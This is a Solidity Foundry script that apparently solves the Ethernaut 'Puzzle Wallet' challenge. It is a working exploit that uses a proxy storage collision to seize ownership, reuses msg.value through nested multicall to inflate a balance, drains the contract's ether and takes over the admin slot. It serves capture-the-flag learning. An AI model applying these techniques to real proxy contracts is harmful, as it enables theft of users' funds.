// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level24.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@openzeppelin-contracts/contracts/utils/Strings.sol";

///@notice Storage collision
contract Level24Solution is Script {
    PuzzleProxy level = PuzzleProxy(payable(0x37E8B500D0fddBaCb7fB68D27499425b09557CBD));
    PuzzleWallet level2 = PuzzleWallet(payable(0x37E8B500D0fddBaCb7fB68D27499425b09557CBD));
    
    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Storage collision in slot 0 and 1 between both contracts
        // PuzzleWallet (Implementation) : PuzzleProxy (Proxy)
        // Slot 0 - owner: pendingAdmin
        // Slot 1 - maxBalance : admin
        // Slot 2 - whitelisted
        // Slot 3 - balances


        // Step 1: By calling proxy's proposeNewAdmin(), we will update both pendingAdmin and owner to the same address
        level.proposeNewAdmin(vm.envAddress("MY_ADDRESS"));
        console.log('owner: ', level2.owner());
        console.log('pendingAdmin: ', level.pendingAdmin());


        // Step 2: Now that we are the owner of PuzzleWallet, we are able to add ourself to whitelist
        // So that we can call other functions within the contract
        level2.addToWhitelist(vm.envAddress("MY_ADDRESS"));

        // Step 3: Next up, we want to update the state of maxBalance(uint256) with our address as the value
        // So that this will update our address to Slot 1 of PuzzleProxy(admin) and PuzzleWallet(maxBalance)
        // However, the contract starts off with 0.001 ether. Hence, we will need to drain it before updating it
        // To drain the ether in the contract, we can only use execute() to 'withdraw'. Hennce, we need to increase our balance to be
        // the same amount of ether as the contract. In order to do so, we can send 0.001 ether and deposit into the contract.
        // At the same time, we nest another deposit() which will make use of the same 0.001 ether, but increase our balance to 0.002
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(level2.deposit.selector);
        bytes[] memory multipleCall = new bytes[](2);
        // In each multicall, we can only deposit() once. Hence to achieve 2 deposits,
        // we need to nest another multicall inside the first multicall
        multipleCall[0] = abi.encodeWithSelector(level2.deposit.selector);
        multipleCall[1] = abi.encodeWithSelector(level2.multicall.selector, depositSelector);

        // In here, we only send 0.001 ether over, but our balance increases by 0.002 instead because the msg.value gets reused.
        level2.multicall{value: 0.001 ether}(multipleCall);
        // Now that our balance is same as the contract's balance (0.002 ether), we can call execute() to drain them
        level2.execute(vm.envAddress("MY_ADDRESS"), 0.002 ether, "");
        console.log('balance: ', address(level2).balance);

        // Step 4: Now that the contract balance is 0, we can update the Slot 1 storage (maxBalance & admin) to our address
        level2.setMaxBalance(uint256(uint160(vm.envAddress("MY_ADDRESS"))));
        console.log('admin: ', level.admin());
        
        vm.stopBroadcast();
    }
}
